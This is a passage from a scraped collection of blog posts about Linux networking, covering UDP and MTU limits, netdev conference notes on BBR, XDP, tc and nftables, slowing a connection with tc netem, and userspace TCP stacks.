bunch of denial of service attacks in various ways\n(“you can write someone else’s address as the return address. A lot.\nThis sucks.“) \n UDP came about when tcp was split into ip and tcp \n “It’s really hard to do load balancing well for UDP, but that can be\nreally important (eg for server infrastructure for video calls).” \n DHCP uses UDP \n strictly speaking UDP carries “more data” than TCP because TCP headers\ntake more space (more overhead) than UDP headers \n I think there are some issues with UDP and network address translation\n(NAT) because UDP doesn’t have connections. I’m not super clear on\nthis though. \n It’s easier to spoof IPs for UDP traffic since no handshake is\nnecessary \n \n\n Questions \n\n \n Why would you use TCP instead of UDP? Why would you use UDP\ninstead of TCP? \n Why is UDP considered ‘not blocking’?? What is configurable about it?\nSendbuffer / receive buffer size?? \n “why would you use this? why is unreliable a better idea sometimes?” \n how lossy is it in practice? \n \n\n"},
{"url": "https://jvns.ca/blog/2017/02/07/mtu/", "title": "How big can a packet get?", "content": "\n     \n\n Today I put my new  networking zine  on the internet! I am very\nexcited about that. If you are interested in networking but don’t quite\nknow how it all fits together, you could take a look! \n\n Today, let’s talk about packet sizes. \n\n UDP \n\n UDP is a simple protocol for sending information – you put information\nin a packet, send the packet to its destination, and it might get there\nor not. \n\n One interesting thing about this is – when you send a UDP packet, you\nneed to decide how  much  information to put in the packet. \n\n This means that you need to know how much data can fit in a packet!\nHere’s a diagram showing what a UDP packet looks like. \n\n The only thing I want you to pay attention to here is the size of the\n“length” section – 16 bits \n\n \n \n \n\n maximum UDP packet size: 2^16 bits \n\n So! The number for the length of a UDP packet is 16 bits wide. This\nmeans it can be between 0 and 2^16 - 1, or 0 to 65535. \n\n So, I can have a UDP packet that is 65535 bytes, right? \n\n Well, it turns out that if you send a UDP packet that is 30,000 bytes on\nthe internet, it will probably not arrive. Why not? This is because of\nEthernet! \n\n Meet: Ethernet frame sizes and the MTU \n\n When you send a packet to another computer on the internet, it needs to\ngo through a bunch of cables. Some of them are Ethernet cables. \n\n Every packet lives in an  Ethernet frame .\nEthernet frames can only contain 1500 bytes of data. This is called the\n“maximum transmission unit” or “MTU”! \n\n So, if I try to send a 30,000 UDP packet using an Ethernet protocol with\nan MTU of 1500 bytes, what will happen? We can’t send 30,000 bytes in\n1500 bytes. It doesn’t work. \n\n So one of two things will happen: either the packet will get  dropped \n(not sent at all) or  fragmented . \n\n Packet fragmentation \n\n Sometimes networking implementations will split up packets into multiple\npieces. So if you have a packet that is 15,000 bytes, you could split it\nup into 10 or so 1,500 byte packets. \n\n I think this works okay with TCP packets (TCP packets are already a data\nstream split up into many pieces, so you can just split it up further\nand it’ll get reassembled at the end). \n\n It seems weirder to me to split up a UDP packet – if I’m sending you a large UDP packet\nand it gets fragmented, how do I reassemble it? What if the parts that\nsplit up got out of order? Someone on Twitter told me you can reassemble\nUDP packets but I don’t know how it works yet. \n\n I’m definitely still confused about how packet fragmentation works and\nin what cases it makes you lose packets. (is fragmentation worse for TCP\npackets or UDP packets?) \n\n How do you figure out your MTU? \n\n What if you want to know what the MTU is between two points? \n\n It turns out that you can use a thing called  Path MTU\nDiscovery . I found\nthis out by reading the wikipedia article as usual. Basically you \n\n \n send a large packet with a flag on it saying “never fragment this!” \n at the first point where that packet would be fragmented, it’ll notice\nand send back an ICMP packet saying that the packet got fragmented\n(ICMP packets are what routers use to send meta information like this) \n success! You now know the first point at which the packet would be\nfragmented! \n \n\n It turns out that on Linux there is a tool that will do this called\n tracepath . \n\n $ tracepath google.com\n1?: [LOCALHOST]                                         pmtu 1500\n1:  OpenWrt.lan                                           1.705ms \n1:  OpenWrt.lan                                           1.973ms \n2:  10.252.42.193                                         9.116ms \n3:  10.170.192.58                                         8.046ms\nasymm  4 \n \n\n I think the MTU on my local network is 1500 bytes. Which makes sense I\nguess! My local network is pretty normal. \n\n David Murray gave a talk about Path MTU Discovery at Papers We Love\nSeattle which  looks pretty interesting . \n\n jumbo frames \n\n Sometimes you can send huge packets though! On the internet in general,\nyou can’t expect to be able to send packets above 1500 bytes, but if you\nown the whole datacenter and all of your network infrastructure? Why\nnot! \n\n Newer versions of Ethernet support “jumbo” frames, which means that you\ncan send large packets. \n\n This  documentation about MTU inside AWs is really interesting  if you run AWs instances and are wondering how all this applies to AWS. \n\n that’s all \n\n Probably I’ve gotten something wrong in here somewhere. I think the fact\nthat there are these limits on packet sizes on the internet is super\ninteresting! I found the Wikipedia articles on this topic to be pretty readable. \n\n"},
{"url": "https://jvns.ca/blog/2017/04/07/netdev-conference-day-2/", "title": "netdev conference, day 2", "content": "\n     \n\n Hello! Here are notes from the second day of the netdev conference!\n this great tutorial on how to filter packets with XDP/BPF was also today and i wrote it up\nseparately \n\n very very rough list of themes: \n\n \n lots about BBR, a TCP congestion algorithm from Google \n you can take the linux kernel networking stack and put it in\nuserspace? and it works?? \n tc  is a cool tool and it can program network cards to do amazing\nthings \n benchmarking networking algorithms is hard and it’s important to build\nbenchmarking tools \n even more information about XDP and why it’s fast! \n \n\n BBR talks \n\n There were 2 talks about BBR! I was super confused at the beginning\nbecause I came late and didn’t know what BBR was. \n\n Here’s what I know so far. \n\n TCP algorithms today all fundamentally interpret packet loss as\n“congestion”. The idea is that – if packets are being lost along the\nway, then there must be too much data being sent, so you should slow\ndown. TCP algorithms scale their “window size” up and down in response\nto congestion. The window size is basically the amount of data that’s\nyou’re allowed to send before it being ACKed. \n\n Today the TCP congestion control algorithm the Linux networking stack\nuses is called CUBIC. But there is a new\ncongestion control algorithm on the block! It is called BBR and here’s\nan  article from Google about it from Dec. 2016 in ACM Queue . \n\n BBR tries to \n\n \n estimate the round-trip time between you and your client \n estimate how much free bandwidth there is between you + your client \n \n\n I think the idea here is that – if you know how much free bandwidth\nthere is between you and your client (“100MB/s”) then you should just\nsend that much data, even if there is some packet loss along the way. \n\n I have no idea how BBR estimates how much bandwidth there is but that’s\na start. I’m planning to read the Google article about it. \n\n The first talk (Driving Linux TCP Congestion Control algorithms around the LTE\nnetwork Highway by Jae Won Chung, Feng Li) was about using BBR with LTE (mobile) networks, I think.\nI came in late and so I didn’t learn a lot but it sounded positive. \n\n linux kernel networking, in userspace \n\n by Hajime Tazaki \n\n The next talk was really cool! The idea was – maybe you want to use the\nLinux network stack (because it is a mature network stack) but you want\nto either \n\n \n use it on Linux, but with different options / a newer version \n use it on Windows/FreeBSD/some other operating system. \n \n\n So basically instead of using Linux, you take all the Linux networking\ncode and just use it as a library! \n\n This talk used the  linux kernel library project , specifically to look at BBR performance inside LKL. \n\n The speaker  went through a few different performance\nproblems he ran into. \n\n The goal was to get the same performance with LKL as you would when\nrunning the same code as Linux kernel code. \n\n first benchmark \n\n in their first benchmark, they set up two computers connected with a\n10Gbps link, and tested Linux with BBR and LKL with BBR. At the\nbeginning, Linux was getting 9.4Gbps (good!) and LKL was doing 0.45 Gbps\n(very bad!!) \n\n The problem here was that BBR really needs accurate timing, and for some\nreason the LKL implementation had really bad resolution (100HZ, so it\ncould be off by up to 5ms). \n\n Increasing the resolution to 1000Hz (by changing the kernel jiffies\nsetting) made things way better (LKL got 6Gbps instead of 0.4), and\npatching LKL \n\n This seemed to be interesting to people because people  thought  that\nBBR was really sensitive to inaccuracies in timing measurements, but\nthese experiments showed that you really did need to have accurate\ntiming. Cool! \n\n second benchmark \n\n In the second benchmark they added a bunch of latency between the two\nsystems (using tc!!). At the beginning Linux did 8.6Gbps (good!) and LKL\ndid 0.18Gbps (very very bad!). \n\n It turned out that this was because the LKL box had a very small socket\nbuffer. This makes sense, I think! If you have more latency in your system, you’re\ngoing to need more buffer space to store packets. So they had to set the sysctl\nthat Linux uses to control socket buffer size. This is easy to do in LKL! \n\n XDP mythbusters \n\n by David Miller \n\n There are basically an infinite number of XDP talks at this conference\n:). This one basically listed a bunch of facts & myths about XDP. It was\npretty opinionated and I will reproduce the opinions here :) \n\n facts \n\n \n XDP runs  when the device driver receives a packet \n XDP can  modify packet contents \n XDP  doesn’t do memory allocation  (so things go faster) \n XDP is  stateless  (so things go faster) \n \n\n reasons to use XDP \n\n \n DDoS prevention \n load balancing \n collecting statistics about your packets \n sophisticated traffic sampling (with  perf_events , you can come up\nwith fancy rules and decide what to sample) \n high frequency trading (“but they won’t tell us what they did, it’s\ntheir secret sauce :)“) \n \n\n ebpf myth list \n\n the idea here is that the answer to all of these questions is “no” \n\n \n is XDP just a fad? “no” \n is XDP unsafe because you’re letting user code run in the kernel? “no,\nthe eBPF verifier checks that the code is safe. if you trust virtual\nmemory protection / the kernel to protect you from userspace, you\nshould trust this too!” \n is XDP less flexible than DPDK? (i didn’t understand why the answer is\n“no” bc i don’t really understand what DPDK is, but he said you can\naccess kernel objects which is cool, and there’s “no container story”\nfor DPDK) \n is XDP a replacement for netfilter/tc? (“no, there’s some overlap, but\nXDP has limits because it’s stateless”) \n \n\n things that are going to be changing with XDP: \n\n \n more introspection \n debugging symbols, probably CTF and not DWARF because “DWARF is too\ncomplicated” \n tracing with perf events \n \n\n He also made a parallel with Arduino development – in arduino you make\nsome binary code and put it into your Arduino and it’s kind of the same\nworkflow as XDP. He also said “arduino doesn’t any introspection and\npeople love it” which is maybe true? Unclear. I love debugging tools a\nlot :) \n\n new TC offloads \n\n chair: Jamal Hadi Salim (who is also the conference chair and did a\nreally really wonderful job throughout). He told me things about tc at lunch\nyesterday! \n\n okay so – apparently TC (the tool that lets you slow your network down)\nis actually a big deal and you can do a ton of stuff with it. I am only\nslowly learning what all those things are. \n\n One cool thing about TC is: \n\n \n tc can do a lot of things (like delay packets, drop packets at\nrandom, modify packets, do “traffic shaping” stuff) \n for a lot of the things TC can do, it can also train your hardware\nhow to do it for you! which is faster! So you can buy a relatively\ncheap network card and have it do operations on your packets for you,\nthat you program \n \n\n Being able to program your network card to do stuff for you just by\nrunning a thing on the command line seems pretty magical so I think I\nunderstand why there was like 1.5 hours about new capabilities there. \n\n I only used tc for the first time last week so I am still struggling to\nunderstand what’s going on with it but here are some new tc subcommands: \n\n \n pedit munge ip ttl add 255  (this actually  subtracts  1 from the\nTTL, it’s unsigned integer arithmetic) \n pedit munge eth dst set 11:22:33:44:55:66  changes the destination\nMAC address \n \n\n and those are both things that you can program your network card to do,\nif you have the right network card. \n\n testing \n\n tc is a userspace program, and it integrates pretty tightly with the\nkernel, and it’s always getting new features, so it’s important to make\nsure its features stay in sync. \n\n Someone demoed a testing framework for tc where you define tests in\nJSON, which seemed really nice! \n\n lunch (aka PCI bus time) \n\n Yesterday there was a talk about virtualization and about how the PCI\nbus is a bottleneck. I didn’t know what a PCI bus was so I asked\nsomeone. He was like “is that a serious question” but he answered me!\nHere is what I know so far about the PCI (or PCIe?) bus. \n\n \n it goes between your CPU and your network card (and other peripherals) \n but also actually sometimes the network card writes stuff directly\ninto RAM  through the PCI bus (with DMA?).  here is a blog post . \n its jobs is to send bytes from your network to your CPU, and vice\nversa \n it is slower than your CPU \n usually the network card is slower than the PCI bus, so the PCI bus is\nnot the bottleneck, but sometimes when packets are too small, then\nthings get inefficient and the PCI bus becomes the bottleneck \n but why is it more inefficient? \n well – I’m still confused, but someone told me that when the network\ncard sends packets, it does not just send packets. It also sends you\nmetadata about those packets! So if there are more small packets,\nthere is more metadata, and that is inefficient. \n \n\n I’m still pretty vague about all of this but I know more than yesterday\nso that’s cool \n\n netesto \n\n Lawrence Brakmo from Facebook demoed an interesting looking network testing\nframework! \n\n This also involved that BBR TCP congestion algorithm from before. He\nemphasized that when you do the same networking tests between the same\ncomputers under the same conditions, the results can be really\ndifferent! So it’s important to repeat your tests a lot of times. \n\n He gave an example of a test with BBR: he tested having 2 TCP streams\n(so you start sending data from A to B, and then 20 seconds in start\nsending more data from C to B). He tested this 25 times, and 3 of those\n25 times, the results were REALLY BAD. Like the second TCP stream only\ngot to 100Mbps bandwidth even though there was a lot more available. \n\n He said this tool will appear at  https://github.com/facebook/fbkutils  by\nApril 14. \n\n that’s all! \n\n Tomorrow is the last day, so more tomorrow. \n\n"},
{"url": "https://jvns.ca/blog/2017/04/01/slow-down-your-internet-with-tc/", "title": "Slow down your internet with tc", "content": "\n     \n\n Hello! This week I learned how to make my internet slower on purpose! My\nawesome coworker Doug told me about tc, which is a tool for Linux that\nstands for “traffic control”. \n\n I’d actually heard about this tool a while ago when I interviewed\nsomeone awesome and she was telling me about her experience using tc in\nher last job. But I hadn’t thought about it since then, and I definitely\nhadn’t used it! \n\n He pointed me to this blog post  Adding simulated network latency to your Linux server \nwhich explains it really well. \n\n use tc to make your personal internet slow \n\n I tried  tc  out on my laptop! The incantation in that blog post told\nme how to add extra latency to every packet I send. So when any program\non my computer sends a network packet, it’ll just get sent…  a bit\nlate. Here’s what that looks like: \n\n sudo tc qdisc add dev wlp3s0 root netem delay 500ms\n# and turn it off with\nsudo tc qdisc del dev wlp3s0 root netem\n \n\n wlp3s0  is the network interface for my wireless card, and this command\nadds a 500ms delay to every packet. Totally unsurprisingly, browsing the\ninternet got a lot slower. There was something surprising, though! \n\n Last week I learned about this site that compares the speed of HTTP and\nHTTPS for loading a whole bunch of small images:\n http://www.httpvshttps.com/ . \n\n Here’s a table with how long it took with my normal internet and with\nartifically-slowed down internet. \n\n                     http    | https\nnormal internet |  3.5s     | 0.7s\n500ms delay     |  33s      | 1.1s\n(with TLS connection already open)\n500ms delay     |  33s      | 5s\n(with new TLS connection)\n \n\n That’s weird, right? The HTTP version got 10x slower, but the https\nversion didn’t slow down as much. To understand why, you have to\nread this article  I wanna go fast: HTTPS’ massive speed advantage  . \n\n Basically HTTP/2 (the next version of HTTP) only\nworks when you’re using HTTPS, and HTTP/2 lets you do a lot more\nrequests in parallel, so you’re not slowed down as much. \n\n There’s something else weird in this table though. It says that with my\n500ms delay, the HTTPS version of the page loaded in 1.1s. But to do HTTPS you have to do a\nTLS handshake, and if your latency is 500ms you can definitely not\nopen the connection and send/receive data in 1.1s. When the HTTPS version was taking 1.1s it\nwas reusing a TLS connection that was already open. Still, when I\nrestarted my browser and opened the website from scratch it only took 5\nseconds. That’s really a lot faster than 33s! I might conceivably wait 5\nseconds for a page to load but I feel like I’d get too bored in 30 seconds. \n\n So it’s really neat to see that HTTPS and HTTP/2 are really possibly\nmaking things faster for people with high latency! \n\n use tc to make your server internet slow \n\n You can also use tc to make your server internet slow. I used tc to make\na DNS server in a test environment slow to see how a DNS client I was\ninterested in would behave, exactly. \n\n It’s important to note that – you probably don’t want to add a\ndelay to every packet on a machine in production, you might have a bad\nday. Unless your goal is really to break things  (“surprise, network\nlatency everyone! let’s find out how your code deals with timeouts!“) in\nwhich case maybe it’s a good idea. \n\n One thing I learned by doing this – if you add a delay to every\npacket on a machine you’re SSHed into, your SSH connection is also\nsending packets, so your SSH connection also gets slow. This was okay\nthough, it was still usable enough. \n\n that’s all \n\n I think there are more things you can do with tc but I don’t know what\nthey are yet! I think it’s cool that you can pretend to be on a machine\nthat is Really Far Away by just running one command on your laptop! \n\n"},
{"url": "https://jvns.ca/blog/2016/06/30/why-do-we-use-the-linux-kernels-tcp-stack/", "title": "Why do we use the Linux kernel's TCP stack?", "content": "\n     \n\n I’m at PolyConf in Poland today, and I watched this super interesting talk by Leandro Pereira about  Lwan , an ~8000 line of code web server. He talked about a bunch of the optimizations they’d done (improve CPU cache performance! be really careful about locking!). You can read more about the performance on the website & the links there. \n\n It’s a super cool project because it started out as a hobby project, and now he says it’s getting to a state where it kinda actually really works and people are using it for real things. This web server is extremely fast – it can do, in some benchmarks, 2 million requests per second. \n\n Before I start talking about this – of course practically nobody needs to do 2 million requests per second. I sure don’t. But thinking about high performance computing is a really awesome way to understand the limits of computers better! \n\n I tracked him down to ask him questions later, and he mentioned that most of the time is spent talking to the Linux kernel and copying things back and forth. \n\n writing your own tcp stack is way faster \n\n Then he said something really surprising: that in the  Seastar  HTTP framework, they  wrote their own TCP stack , and it made everything several times times faster. What?! \n\n So – this made me wonder. When we do high performance networking – why do we bother using the Linux kernel’s TCP stack at all, if it’s so expensive? Why not just do all the networking in userspace? I had no idea where to start with this question, so I  asked on Twitter . As often happens, you all came through with ONE BILLION INTERESTING LINKS AND ANSWERS. \n\n embedded devices \n\n If you’re working on a very small computer without an operating system, you sometimes need to do networking anyway! In this case it seems pretty common to use a separate TCP stack. A ton of people mentioned that they either used  lwIP  or wrote their own TCP stack to meet their own specific requirements. \n\n I asked a few people whether anyone uses lwIP on a Real Server, but it seems like it’s optimized for small devices, and not for doing huge amounts of network traffic on big servers. \n\n high frequency trading \n\n Who cares about doing a ton of very fast network requests? People who do high frequency trading! Luke Gorrie on Twitter (who works on the extremely cool  Snabb Switch  open source Ethernet stack) said: \n\n \n Solarflare sell a userspace TCP stack to HFT market (OpenOnload) for use with\ntheir NICs. Code is GPL actually. \n \n\n So, this makes a lot of sense. If you want to do super high performance networking, you can probably afford to buy special network cards and special software to make those network cards perform super well. Cool. But what if you want to do higher performance networking on commodity hardware, with any random network card? Is that a thing? \n\n what about Google? \n\n Who else does a ton of networking? Google! Happily Google sometimes writes papers so we know a little bit about what they do there. \n\n Tons of people told me about  Maglev , which is Google’s load balancer, and they do all of their networking for that in userspace! I think they operate at a lower level than TCP so they don’t have a TCP stack, but it is an example of extremely fast networking without using the Linux kernel. \n\n I haven’t read the Maglev paper yet but it seems like a good starting point. \n\n There’s also  this blog post  and  paper  about software-defined networking at Google. A useful keyword here seems to be “Jupiter” or “Jupiter fabrics” but I’m not sure what that is.  Here’s another article though . \n\n is the real reason to write your own TCP stack for performance? \n\n @tgraf__  made a super interesting point – I thought the reason you would make your own TCP stack was to make it fast. But maybe not always!! \n\n \n Google can’t force Android vendors to rebase kernels but requires new TCP\nfunctionality such as TCP fast open. \n \n\n The TCP standard is evolving, and if you have to always use your kernel’s TCP stack, that means you can NEVER EVOLVE. \n\n why is TCP in the kernel slow? \n\n This  article from LWN  “Van Jacobsen’s network channels” says that dealing with TCP in kernel space means locks and contention. thanks for @tef_ebooks for linking this article and explaining it to me :) \n\n \n The key to better networking scalability, says Van, is to get rid of locking and shared data as much as possible, and to make sure that as much processing work as possible is done on the CPU where the application is running. It is, he says, simply the end-to-end principle in action yet again. This principle, which says that all of the intelligence in the network belongs at the ends of the connections, doesn’t stop at the kernel. It should continue, pushing as much work as possible out of the core kernel and toward the actual applications. \n \n\n how does Seastar work? \n\n That fast networking framework Seastar from before is written using something from Intel called  DPDK . The deal with DPDK seems to be that it’s a network card driver and some libraries, but instead of it giving you packets through interrupts (asynchronously), instead it polls the network card and say “do you have a packet yet? now? now? now?”. \n\n This makes sense to me because in general if you always have new events to process, then polling is faster (because you basically don’t have to wait). Here’s some documentation about the  poll mode driver  and an [example of a DPDK] application. \n\n I think with DPDK you can write networking applications that work entirely in userspace with no system calls.   Cory Benfield  explained a bunch of these things to me. \n\n open source stuff right now: pretty specific \n\n As far as I can tell, there aren’t any available general purpose open source userspace TCP/IP stacks available. There are a few specialized ones, but this does not seem to exist right now. But people seem to be interested in the topic! \n\n some more links \n\n Here are some more links that do networking in userspace! This is mostly a link dump so that I can click on them later but maybe you will like them too. \n\n zmap  is a TCP port scanner. \n\n masscan  is another TCP port scanner. It says it can scan the entire internet in 5 minutes. What? Outlandish! I will need to read more about this! \n\n LKL  is an attempt to make the Linux kernel networking code (as well as other Linux code) into a library (!!) so that we can use it in userspace. This sounds like a monumental effort and also extremely interesting.  @thehakime said about this :.  Here’s a talk about LKL. \n\n \n there are so many uspace network stacks (mtcp, lwip, seastar, sandstrom) but all are so specialized. I think it can be generalized. \n \n\n libuinet  is a library version of FreeBSD’s TCP stack. I guess there’s a theme here. \n\n mtcp  is a userspace TCP stack. I don’t know anything about it. There’s also  uip  and  lwIP . \n\n phew. \n\n Okay, that was a lot of new facts and ideas to come out of the comment “a lot of the overhead of a HTTP server is communicating with the kernel”. \n\n I like how if you ask the right questions Twitter will just hurl super interesting information at you until you’re like OK OK OK MY BRAIN IS FULL. And then they keep telling you awesome stuff anyway :) \n\n There seems to be a lot of work going on here! There are like 100 interesting rabbit holes which I have zero time to investigate right now! Awesome. \n\n Update: Marek Majkowski at Cloudflare wrote a very interesting response to this post  Why we use the the Linux kernel’s TCP stack  which is worth reading. \n\n \nThis is unusual for me to say, but the  Hacker News comments  on this post are mostly quite informative and a few people talk about their experiences, positive and negative, implementing network stacks. I enjoyed reading them.\n \n\n"},
{"url": "https://jvns.ca/blog/2017/04/08/netdev-conference-day-3/", "title": "netdev conference, day 3", "content": "\n     \n\n Okay, it’s the last day of  netdev 2.1 ! Today there was an exciting surprise! This\nmorning on the subway on the way there I got a mysterious text “julia, are you\ncoming to netdev today?” \n\n When I got there (late), I discovered that I’d won a book!! So now I have this\ncool  Linux Kernel Networking book .\nIt’s from 2014 which is pretty recent and I’m looking forward to reading it. \n\n themes from today: \n\n \n netfilter and nftables (which is a replacement for iptables) \n mesh networking (very low-power devices which want to network with each\nother) \n networking daemons \n \n\n I think my main practical takeaway from today was “oh man, maybe I don’t ever\nhave to learn iptables, I should maybe learn nftables instead?” :). Not sure\nyet though! Maybe I still have to learn how iptables works! \n\n netfilter workshop \n\n by Pablo Neira Ayuso \n\n At netdev a ‘workshop’ is not a tutorial, it’s a discussion of new recent\nadvances in the tool. I think this workshop was actually mostly about nftables\n(which is a new system inside netfilter). \n\n netfilter \n\n If you’ve ever used iptables to filter traffic, you’ve used the netfilter\nsystem! netfilter includes a bunch of different ‘tables’: iptables, ipv6tables,\narptables, and ebtables. \n\n I think netfilter is also in charge of NAT, which is why it does connection\ntracking (‘conntrack’) so it can know which connection every packet belongs to. \n\n nftables \n\n nftables is a new packet classification framework that replaces\nthe existing  {ip,ip6,arp,eb}_tables  infrastructure. The idea is that it’s\nmore unified instead of being 4 different things! That makes sense. \n\n The nftables wiki has a bunch of information. There’s also\ninformation in  the man page for nft . \n\n Here are a few bullet points about what nftables is from the  nftables wiki . \n\n \n It is available in Linux kernels >= 3.13. \n It comes with a new command line utility nft whose syntax is different to iptables. \n It also comes with a compatibility layer that allows you to run iptables commands over the new nftables kernel framework. \n It provides generic set infrastructure that allows you to construct maps and concatenation. You can use this new feature to arrange your ruleset in multidimensional tree which drastically reduces the number of rules that need to be inspected until you find the final action on the packet. \n \n\n There’s a web tool you can use to  translate iptables rules to nftables rules . \n\n He also said that the beginning that in some benchmarks, nftables is almost 2x\nas fast as iptables. \n\n new nftables features \n\n Here are some new features from the workshop \n\n \n new extension:  fib  (“forward internet base”). some things it lets you do\n\n \n drop if reverse lookup fails \n drop if there’s no destination route \n drop packets to an address not configured on this interface \n “works well with  Quagga ” (which is a BGP\nthing?) \n \n new extension:  rt  (something about routing?)\n\n \n “drop any traffic to 192.168.0. 1 ⁄ 24  that isn’t routed via 192.168.0.1” \n \n new extension:  notrack  (disable connection traffic)\n\n \n example  nft add rule prerouting dport 80 add notrack  or something (though\ni didn’t get it exactly) \n \n new extension:  quota   (supports byte quotas)\n\n \n example  ip saddr timeout 60s quota over 50 mbytes  I think sets a quota of\n50 MB / minute per IP src address \n \n updated extension:  payload \n\n \n this lets you update checksums (i didn’t understand this) \n \n \n\n I got kind of lost in the rest of the workshop. I did learn that there’s a\nnftables virtual machine with 25 instructions. \n\n Someone asked in the question period whether they’d consider putting eBPF into\nnftables – i think the idea is that all these systems (tc, nftables, etc) are\na lot for users to learn, and if you could define new stuff in eBPF it would be\neasier to add features and easier for users to use (because then you\ndon’t have to learn all these different tools, you can focus on learning\neBPF). I didn’t hear the answer to this. \n\n morning keynote \n\n by Jesse Brandenberg \n\n what I learned from this keynote \n\n \n there are 2.5 million lines of network device driver code in the Linux\nkernel, and it’s increasing fast \n Linux is moving into a lot of different places \n people are gonna be using a lot more bandwidth (1000x more in the next 10\nyears?) \n \n\n on Intel’s direction: \n\n \n intel is moving to switchdev (which is a way to program ASICs on switches\nwith Linux, I think? and ASICs are networking hardware?) \n they want to add more hardware offloading capabilities to tc \n “make Linux the best choice for networking” \n \n\n He said that it’s important to offload crypto operations to hardware. Someone\nasked “we’ve been trying to do that for a while, but Intel keeps releasing new\nspecialized CPU instructions that make it more efficient to just do crypto in\nthe CPU, is that going to change?” \n\n It also doesn’t really seem clear to me that you can offload crypto stuff to\nhardware – like he said you can do IPSec in hardware (I don’t really know what\nthat is, something to do with VPNs or something?), but many people are using\nTLS and I don’t know how you’d do TLS termination in hardware exactly,\nthat seems complicated. He said that it’s not obvious how to do TLS in\nhardware. \n\n new mailing list: xdp-newbies \n\n As of today there is a new kernel mailing list for\npeople who are new to XDP! Cool! There’s a  link to sign up here . \n\n Apparently you have to send plain text email to manage your subscription\nto a kernel mailing list, so today I learned how to send plain text\nemail from gmail. Also I somehow managed to email the list instead of\nthe list admin address (majordomo@vger.kernel.org). Anyway after several\nmishaps I managed to subscribe and now I can lurk :D \n\n IoT workshop! \n\n There was an IoT workshop after lunch. This seemed to be mostly about\n“mesh networking” which is when a bunch of low-powered devices create a\npeer to peer network. \n\n 6lowpan \n\n I had no idea what “6LoWPAN” was so I looked it up! The  wikipedia article \nis pretty good. Basically it seems to be a protocol to send IPv6 messages over\nvery low powered networks. \n\n “low powered network” seems to mean a very specific thing: there’s this\nstandard  IEEE 802.15.4 \nwhich is like the wifi standards ( 802.11 ), in that they define which wireless\nspectrum you use (902-928MHz in North America) and how you send data “frames\nand MAC addresses” on that frequency \n\n But the 802.15.4 standard doesn’t actually define how to structure your packets\ninside those frames, so I think that’s what 6LoWPAN does. \n\n The first talk in this workshop was about “MLE”. what I learned: \n\n \n ZiGBee is a thing in the low powered networking world \n There is a protocol called MLE which is for\n\n \n link establishment \n link quality detection \n network parameter distribution (what’s that?) \n I didn’t totally understand though if anyone uses MLE or how it’s related\nto zigbee \n MLE uses a “frame counter” as a security feature to prevent replay attacks.\nThis is the second time this week i hear about someone using a counter of\nsome sort to prevent replay attacks so that’s interesting. \n \n \n\n LLNs and Linux \n\n by  Michael Richardson \n\n A LLN is a “low-power lossy network”. Some of these networks do 256\nkbits/second, some of them are as slow as 9600 baud. He said at the end of the\ntalk that there are some wide-area networks (where you send data maybe\nkilometers) where you might only be able to send 100  bytes per day . \n\n He has a project called unstrung with has a really pretty website:\n http://unstrung.sandelman.ca/ . \n\n some things I learned: \n\n \n a thing that exists in the world is “kinetically powered lightswitches” –\nthey only get power when you flip them, and only enough to maybe send a\npacket before they die. He said he’s never actually seen one yet even though\nhe’s trying. \n maybe you use some of these mesh networking things to power a gas/water\nmeter? \n the wifi in this room isn’t working well because there are too many access\npoints which are transmitting at too high power, and they’re interfering with\neach other \n so when you have low powered devices like this, you want to only use as much\npower as you need to – you can do sort of a binary search to figure out how\nmuch power you should be using \n \n\n Increasing Reliability in Data Center Network Configuration \n\n by Tom Distler & Arthur Davis, from NetApp \n\n They’re working on a daemon that makes networking changes. This is pretty relevant\nto my interests because I am paying some attention to Kubernetes right now\nwhich makes changes to networking configuration all the time \n\n design goals: \n\n \n provide ACID guarantees around network configuration\nchanges (so if you’re creating 20 network interfaces, you want to get all of\nthem or none of them). That’s a very worthy goal! \n if you crash, you should be able to recover \n applications can ask the networking daemon to make changes \n \n\n The data model reflects the structures that exist in the kernel (interfaces,\nrouting tables, etc). They don’t try to add any extra abstractions over what\nthe kernel provides. \n\n When a client wants to make some changes to reconfigure the network, they fetch\nthe database from the daemon, make changes, and tell it to apply those changes.\nSo I guess this is kinda like tools like Terraform in a way? (you tell it what\nthe state you want it to end up in is, and then it works to apply that state?) \n\n They said they looked at other systems that did similar things but didn’t say\nwhat they were. \n\n The tool they’re building isn’t open source yet but I guess we’ll see what it\nlooks like when it is open source! \n\n closing remarks \n\n The next netdev will be in South Korea in November. \n\n some thoughts on the conference \n\n Awesome things about this conference: \n\n \n almost everyone (maybe everyone?) I met at this conference knew WAY\nWAY WAY\nmore about linux kernel networking than I do. I met people who write\nlinux kernel device drivers, people who work on userspace networking\nstacks that interact heavily with the kernel, people who work at\ncompanies that make network hardware, and more. \n all the people I met were really friendly and happy to explain things\nto me. \n the talks were often about things I hadn’t heard of before at all. this falls\nin the category of “awesome things” even though it meant the conference was\npretty hard to understand because learning about new things is like..\nthe reason I go to conferences. \n the XDP/BPF tutorial yesterday was REALLY GOOD, super super\nwell done, I learned a ton from it. \n \n\n some things about this conference that were different from usual\nconferences I go to: \n\n \n people’s slides had a lot of text and code on them. Usually I think of\nthat as a “bad thing” but actually as long as it’s readable & well\norganized I think it can be kind of good? like I know that there is a\nnetfilter command fragment  ip saddr timeout 60s quota over 50 mbytes \nto put a quota per IP address because it was on a slide with a lot of\nother text and I wrote it down \n like on the balance I think I prefer some text/code to cat gifs if the\nperson is trying to explain a code thing to me :) \n they don’t accept recycled talks, your talks is supposed to be kinda\noriginal research / a new development in linux kernel networking and\nnot a talk that been given before anywhere. \n they only had men’s t-shirts, not women’s t-shirts. I’ve never seen\nthat before and I thought it was kind of\nsilly, there were lots of women at the conference and in 2017\nconferences should have women’s t-shirt sizes :). The tshirt designs\nwere fun though! This was the  mascot . \n \n\n Basically the conference was super-specialized and focused (not for a\ngeneral developer audience at all!) and that was really awesome because\nI got to learn a lot about linux kernel networking. \n\n Those are all my conference notes. Blogging this conference has been\nfun! It made me pay closer attention than I probably would have\notherwise, and now I can remember what I learned about! And other people\nget to learn some of the things too which is of course my favourite\nthing. A+ would blog again. \n\n"},
